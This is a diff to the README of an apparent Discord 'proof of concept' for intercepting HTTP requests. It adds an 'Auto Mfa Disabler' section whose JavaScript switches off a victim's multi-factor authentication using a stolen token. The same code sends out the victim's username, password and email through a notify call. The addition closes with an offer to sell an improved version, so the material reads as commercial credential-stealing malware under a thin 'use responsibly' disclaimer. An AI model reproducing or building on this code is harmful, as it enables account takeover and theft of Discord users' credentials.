@@ -110,6 +110,29 @@ Proof of Concept (PoC) for Intercepting HTTP Requests in Discord
 ### System Information
 ![x](./assets/img/system.png)
 
+
+### Auto Mfa Disabler
+```js
+if(CONFIG.auto_mfa_disabler === 'true') {
+    await delay(5000);
+
+    const autoMfadisablerToken = await autoMfadisabler(response, token, 'backup');
+
+    content = {
+        content: `**${user.username}** mfa was deactivated automatically!`,
+        embeds: [{
+            fields: [
+                { name: "Password", value: `\`${password}\``, inline: true },
+                { name: "Email", value: `\`${email}\``, inline: true },
+            ],
+        }],
+    };
+
+    notify(content, autoMfadisablerToken, user);    
+};
+```
+*If you are interested in an improved version with more features such as auto mfa deactivator and premium options you can buy it*
+
 ## Note
 
 Use this PoC responsibly and only on systems and applications where you have explicit permission to test. Unauthorized use may violate terms of service and legal agreements.
